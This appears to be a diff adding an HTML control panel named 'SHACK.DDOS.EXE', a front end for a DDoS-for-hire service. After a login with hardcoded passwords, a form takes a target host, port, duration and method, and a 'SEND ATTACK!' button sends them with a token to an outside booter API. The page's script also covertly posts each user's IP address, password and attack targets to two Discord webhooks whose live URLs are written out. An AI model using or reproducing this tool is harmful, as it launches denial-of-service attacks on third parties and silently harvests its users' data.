@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHACK.DDOS.EXE</title>
+    <style>
+        /* Basic Reset and Dark Theme */
+        body {
+            font-family: Arial, sans-serif;
+            color: #FFFFFF;
+            background-color: #000000;
+            max-width: 500px;
+            margin: auto;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        h1 {
+            text-align: center;
+            color: #FF6347;
+        }
+        input[type="text"], input[type="number"], input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            margin: 8px 0;
+            box-sizing: border-box;
+            background-color: #333333;
+            color: #FFFFFF;
+            border: 1px solid #666666;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #FF6347;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #FF4500;
+        }
+
+        /* Login Popup Styling */
+        #loginPopup {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            text-align: center;
+        }
+        #loginPopup input {
+            margin: 10px;
+        }
+
+        /* iFrame Style */
+        iframe {
+            width: 100%;
+            height: 400px;
+            margin-top: 20px;
+            border: 1px solid #666666;
+            background-color: #1A1A1A;
+        }
+
+        /* Snowfall Animation */
+        .snowflake {
+            position: absolute;
+            top: -10px;
+            color: #FFFFFF;
+            font-size: 1em;
+            opacity: 0.8;
+            animation: fall linear infinite;
+        }
+        /* Keyframes for Snowfall */
+        @keyframes fall {
+            0% {
+                transform: translateY(0) translateX(0);
+                opacity: 0.8;
+            }
+            100% {
+                transform: translateY(100vh) translateX(10vw);
+                opacity: 0.1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Popup -->
+    <div id="loginPopup">
+        <h2>Login Required</h2>
+        <input type="text" id="loginToken" placeholder="Enter Token" required>
+        <input type="password" id="loginPassword" placeholder="Enter Password" required>
+        <button onclick="validateLogin()">Login</button>
+    </div>
+
+    <h1>SHACK.DDOS.EXE</h1>
+    <form id="apiForm">
+        <label for="host">Host:</label>
+        <input type="text" id="host" required>
+
+        <label for="port">Port:</label>
+        <input type="number" id="port" required>
+
+        <label for="time">Time:</label>
+        <input type="number" id="time" required>
+
+        <label for="method">Method:</label>
+        <input type="text" id="method" required>
+
+        <button type="button" onclick="openRequest()">SEND ATTACK!</button>
+    </form>
+
+    <!-- Display Website in iFrame -->
+    <iframe id="urlFrame" src=""></iframe>
+
+    <!-- Snowfall Effect Elements -->
+    <script>
+        // Snowfall Effect
+        function createSnowflake() {
+            const snowflake = document.createElement("div");
+            snowflake.classList.add("snowflake");
+            snowflake.textContent = "❄";
+            snowflake.style.left = Math.random() * 100 + "vw";
+            snowflake.style.animationDuration = Math.random() * 3 + 2 + "s";
+            snowflake.style.fontSize = Math.random() * 10 + 10 + "px";
+            document.body.appendChild(snowflake);
+            setTimeout(() => { snowflake.remove(); }, 5000);
+        }
+        setInterval(createSnowflake, 200);
+
+        // Allowed Passwords
+        const allowedPasswords = ["CookieG.O.A.T", "AlphaG.O.A.T", "PublicG.O.A.T", "SatyaG.O.A.T"];
+        let token = "";
+
+        // Discord Webhook URLs
+        const loginWebhookUrl = "https://discord.com/api/webhooks/1300082791576240234/FZ5dPJLFRUL_OOzeAzz-TljsKFH0gdDrKPYfMrondBOzEaPEZRqsuNovxkbWBjlOLgdz";
+        const ddosWebhookUrl = "https://discord.com/api/webhooks/1300083213363970110/pfdh9Fur7wTuNYNd47-cIwR1Z1dpsRdECj4ZgaehQ9cy3TsBdV5iB3bU9UGUPydZmvom";
+
+        // Helper function to get IP
+        async function getUserIP() {
+            const response = await fetch("https://api64.ipify.org?format=json");
+            const data = await response.json();
+            return data.ip;
+        }
+
+        // Send data to Discord Webhook
+        async function sendToDiscord(webhookUrl, jsonData) {
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(jsonData)
+            });
+        }
+
+        // Validate Login
+        async function validateLogin() {
+            token = document.getElementById("loginToken").value;
+            const password = document.getElementById("loginPassword").value;
+
+            if (allowedPasswords.includes(password)) {
+                document.getElementById("loginPopup").style.display = "none";
+
+                // Log IP and time to Discord
+                const userIP = await getUserIP();
+                const time = new Date().toLocaleString();
+
+                // Prepare JSON data
+                const loginMessage = {
+                    content: null,
+                    embeds: [
+                        {
+                            title: "NEW LOGIN LOG",
+                            description: `\`💀\` ➡ \`${userIP}\`\n\`🦴\` ➡ \`${password}\`\n\`🐱‍🏍\` ➡ \`${time}\``,
+                            color: 4718336,
+                            image: {
+                                url: "https://steamuserimages-a.akamaihd.net/ugc/244710630325715238/DBF2154CE721814E9B0F8C6B14D1578A92A3F7B1/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false"
+                            },
+                            thumbnail: {
+                                url: "https://i.gifer.com/81RA.gif"
+                            }
+                        }
+                    ],
+                    attachments: []
+                };
+                await sendToDiscord(loginWebhookUrl, loginMessage);
+
+            } else {
+                alert("Invalid Password!");
+            }
+        }
+
+        // Open Request in iFrame
+        async function openRequest() {
+            const host = document.getElementById('host').value;
+            const port = document.getElementById('port').value;
+            const time = document.getElementById('time').value;
+            const method = document.getElementById('method').value;
+
+            // Build the API URL and update iFrame
+            const apiUrl = `http://stingnetworks.net//?token=${token}&host=${host}&port=${port}&time=${time}&method=${method}`;
+            document.getElementById('urlFrame').src = apiUrl;
+
+            // Log DDoS attempt to Discord
+            const userIP = await getUserIP();
+            const attackMessage = {
+                content: null,
+                embeds: [
+                    {
+                        title: "DDoS ATTEMPT LOG",
+                        description: `\`💻\` ➡ \`${userIP}\`\n\`🔑\` ➡ \`${document.getElementById("loginPassword").value}\`\n\`⏱️\` ➡ \`${new Date().toLocaleString()}\`\n\`🌐\` ➡ \`${host}\`\n\`📍\` ➡ \`${port}\`\n\`🚀\` ➡ \`${method}\``,
+                        color: 16711680, // Red color
+                    }
+                ],
+                attachments: []
+            };
+            await sendToDiscord(ddosWebhookUrl, attackMessage);
+        }
+    </script>
+</body>
+</html>
